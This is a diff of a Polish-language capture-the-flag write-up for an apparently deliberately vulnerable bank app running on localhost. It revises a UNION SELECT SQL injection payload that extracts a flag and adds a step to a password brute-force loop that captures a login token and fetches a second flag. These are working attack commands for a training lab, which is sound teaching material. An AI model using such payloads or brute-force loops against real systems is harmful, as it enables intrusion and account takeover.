@@ -176,12 +176,12 @@ BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
 
 # UNION SELECT — wyciągnij flagę z tabeli flags
-PAYLOAD="' UNION SELECT id,flag_value,to_account_id,amount,title,created_at FROM flags WHERE challenge_id='A05'--"
+PAYLOAD="' UNION SELECT 1, 2, 3, 0, flag_value, NOW() FROM flags WHERE challenge_id='A05'--"
 
 curl -G "http://localhost:5000/api/transactions/search" \
   -H "Authorization: Bearer $BANK_TOKEN" \
   --data-urlencode "q=$PAYLOAD"
-# W odpowiedzi: "from_account_id": "PWR{sqli_transactions_leaked}"
+# W odpowiedzi: "title": "PWR{sqli_transactions_leaked}"
 ```
 
 ### Naprawa
@@ -242,10 +242,15 @@ for PASS in "${PASSWORDS[@]}"; do
     -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"$PASS\"}")
   if echo "$RESULT" | grep -q '"token"'; then
     echo "HASŁO: $PASS"
+    BANK_TOKEN=$(echo "$RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
     break
   fi
 done
 # HASŁO: password123
+
+# Po zdobyciu tokena — pobierz flagę z profilu
+curl -s -H "Authorization: Bearer $BANK_TOKEN" http://localhost:5000/api/profile/
+# "flag": "PWR{no_ratelimit_bruteforce}"
 ```
 
 ### Exploit (Burp Suite Intruder)
